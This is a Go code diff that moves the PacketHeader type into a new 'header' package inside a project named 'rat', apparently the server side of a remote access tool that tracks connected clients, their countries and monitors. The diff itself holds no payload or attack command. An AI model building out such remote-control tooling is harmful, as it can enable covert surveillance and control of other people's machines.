@@ -9,6 +9,8 @@ import (
 	"net"
 	"rat/shared"
 	"rat/shared/network"
+	"rat/shared/network/header"
+
 	"strconv"
 	"strings"
 	"time"
@@ -16,7 +18,7 @@ import (
 	"golang.org/x/net/websocket"
 )
 
-type listenerMap map[shared.PacketHeader]*websocket.Conn
+type listenerMap map[header.PacketHeader]*websocket.Conn
 
 type Monitor struct {
 	ID     int `json:"id"`
@@ -68,7 +70,7 @@ func NewClient(conn net.Conn) *Client {
 	client.Reader = network.Reader{conn}
 	client.Writer = network.Writer{conn}
 	client.Country, client.CountryCode = GetCountry(client.GetIP())
-	client.Listeners = make(map[shared.PacketHeader]*websocket.Conn)
+	client.Listeners = make(map[header.PacketHeader]*websocket.Conn)
 	client.Monitors = make([]shared.Monitor, 0)
 
 	return client
@@ -185,14 +187,14 @@ func (client *Client) PacketQueue() {
 	}
 }
 
-func (c *Client) ReadHeader() (shared.PacketHeader, error) {
-	var h shared.PacketHeader
+func (c *Client) ReadHeader() (header.PacketHeader, error) {
+	var h header.PacketHeader
 	err := binary.Read(c.Conn, shared.ByteOrder, &h)
 
 	return h, err
 }
 
-func (c *Client) WriteHeader(header shared.PacketHeader) error {
+func (c *Client) WriteHeader(header header.PacketHeader) error {
 	return binary.Write(c.Conn, shared.ByteOrder, header)
 }
 
